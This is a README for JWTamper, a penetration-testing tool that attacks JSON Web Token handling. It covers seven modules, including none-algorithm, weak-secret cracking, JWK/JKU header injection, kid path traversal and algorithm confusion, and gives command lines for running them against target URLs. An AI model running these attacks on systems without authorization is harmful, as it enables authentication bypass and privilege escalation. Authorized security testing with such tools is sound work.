# JWTamper - Automated JWT Testing for Pentesters and Bug Bounty Hunters 

A comprehensive automated toolkit for testing JSON Web Token (JWT) implementations for common security vulnerabilities.

## Features

- **Multiple Attack Vectors**: 7 different attack modules targeting common JWT vulnerabilities
- **Automated Testing**: Batch testing against multiple URLs and endpoints
- **Privilege Escalation**: Built-in payloads for testing admin/root access
- **Custom Targeting**: Specify custom usernames for targeted privilege escalation

## Installation

```bash
git clone https://github.com/jwashek/JWTamper.git
cd jwtamper
pip install requests
pip install cryptography
```

## Quick Start

```bash
# List available attack modules
python jwtamper.py --list-modules

# Test a single URL with all applicable modules
python jwtamper.py --token <JWT_TOKEN> --url https://target.com/api/protected

# Test specific modules only
python jwtamper.py --token <JWT_TOKEN> --url https://target.com/api/protected --modules weak_secret,none_algorithm

# Test multiple URLs from file
python jwtamper.py --token <JWT_TOKEN> --urls-file targets.txt

# Target specific user for privilege escalation
python jwtamper.py --token <JWT_TOKEN> --url https://target.com/api/protected --custom-user john.doe
```

## Attack Modules

### 1. None Algorithm (`none_algorithm`)
Tests if the application accepts JWTs with `alg: "none"`, bypassing signature verification entirely.

**Targets:**
- `alg: "none"`, `alg: "None"`, `alg: "NONE"`
- Tests with original claims and privilege escalation payloads

### 2. Weak Secret Brute Force (`weak_secret`)
**Requirements:** HMAC-signed tokens only (HS256, HS384, HS512)

Attempts to crack HMAC secrets using a comprehensive wordlist of common weak secrets.

**Features:**
- 60+ common weak secrets (empty string, "secret", "jwt", "123456", etc.)
- Automatic termination on successful crack
- Supports all HMAC algorithms

### 3. Unsigned JWT (`unsigned_jwt`)
Tests if the application properly validates JWT signatures.

**Test Cases:**
- Completely missing signature
- Invalid signature values
- Random arbitrary signatures
- Modified payload with original signature

### 4. JWK Header Injection (`jwk_injection`)
**Requirements:** Cryptography library

Embeds attacker-controlled RSA public keys directly in the JWT header.

**Process:**
- Generates real RSA key pairs
- Embeds public key in `jwk` header parameter
- Signs JWT with corresponding private key
- Tests if application trusts embedded key

### 5. JKU Header Injection (`jku_injection`)
**Requirements:** Cryptography library + External hosting

Tests if applications fetch verification keys from attacker-controlled URLs.

**Special Setup Required:**
```bash
# Step 1: Generate JWK set for your exploit server
python jwtamper.py --print-jwk-set

# Step 2: Host the output JSON at https://your-server.com/jwks.json

# Step 3: Run the attack
python jwtamper.py --token <JWT> --url <TARGET> --modules jku_injection --jku-urls https://your-server.com/jwks.json
```

**Important Notes:**
- You must control a web server accessible by the target
- Keys are automatically saved and reused in `~/.jwtamper_jku_keys.pkl`

### 6. Kid Path Traversal (`kid_path_traversal`)
**Requirements:** HMAC-signed tokens only

Exploits the `kid` (Key ID) header parameter to read predictable files on the server filesystem.

**Targets:**
- `/dev/null` (null bytes as HMAC secret)
- Various path traversal patterns
- Windows and Unix path styles

### 7. Algorithm Confusion (`algorithm_confusion`)
**Requirements:** RSA-signed tokens + Cryptography library

Attempts to use RSA public keys as HMAC secrets by switching algorithm from RS256 to HS256.

**Process:**
- Automatically discovers public keys from common JWK endpoints
- Converts RSA public keys to PEM format
- Uses PEM bytes as HMAC secret with HS256
- Tests if application validates with wrong algorithm

## Advanced Usage

### Custom User Targeting
```bash
# Target specific user instead of default admin/root attempts
python jwtamper.py --token <JWT> --url <TARGET> --custom-user "john.smith"
```

### Multiple JKU URLs
```bash
# Test multiple exploit servers for JKU injection
python jwtamper.py --token <JWT> --url <TARGET> --modules jku_injection \
  --jku-urls "https://server1.com/jwks.json,https://server2.com/jwks.json,http://localhost:8080/jwks.json"
```

### HTTP Methods
```bash
# Test with different HTTP methods
python jwtamper.py --token <JWT> --url <TARGET> --method POST
```

### URL File Format
Create a text file with one URL per line:
```
https://target1.com/api/admin
https://target2.com/api/user/profile
https://target3.com/api/sensitive
```

## Success Detection

JWTamper identifies successful attacks based on HTTP response changes:

- **401/403 → 200**: Authentication bypass
- **401/403 → 302/301**: Successful authentication with redirect
- **401 → 403**: Authentication successful, but insufficient permissions
- **401/403 → 500**: Potential bypass causing application error
- **Content length changes**: Significant response differences (>100 bytes)

## Security Considerations

⚠️ **Responsible Testing Only**
- Only test applications you own or have explicit permission to test
- JWTamper is designed for authorized security testing and research
- Unauthorized testing may violate computer fraud laws

**JKU Injection**
- Requires hosting malicious JWK sets on servers you control
- Test servers must be reachable by target applications

## Troubleshooting

### Common Issues

**"Cryptography library required"**
```bash
pip install cryptography
```

**"No JKU URLs provided"**
- JKU injection requires explicit exploit server URLs
- Generate JWK set with `--print-jwk-set`
- Host JSON on accessible web server
- Use `--jku-urls` parameter

**"No RSA public keys available"**
- Algorithm confusion needs to discover keys first
- Ensure target uses RSA algorithms (RS256, PS256, etc.)
- Check if common JWK endpoints are accessible

**All attacks show failure**
- Verify original token works with target application
- Check if JWT is sent via Authorization header or cookies (both cases are tested with JWTamper)
- Confirm target URL is correct and accessible
- Some applications may have additional CSRF protections that could prevent manipulating JWTs properly

## Example Output

```
[+] Testing https://api.example.com/admin...
    Original token: 401 (1247 bytes, 0.23s)
    [+] Running weak_secret...
    [+] Testing 62 potential secrets...
      [x] weak_secret_empty_original_claims: 401
      [x] weak_secret_secret_original_claims: 401
      [!] weak_secret_jwt_original_claims: 200 (SUCCESS)
      [!] SECRET CRACKED! Stopping after 3 attempts.

============================================================
RESULTS SUMMARY
============================================================
Total tests: 3
Successful attacks: 1

[!] CRITICAL FINDINGS:
  [!] weak_secret_jwt_original_claims on https://api.example.com/admin
      Status: 200, Length: 3847
      Modified Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...
```

## Legal Disclaimer

This tool is intended for authorized security testing only. Users are responsible for complying with applicable laws and obtaining proper authorization before testing. The authors assume no liability for misuse of this software.
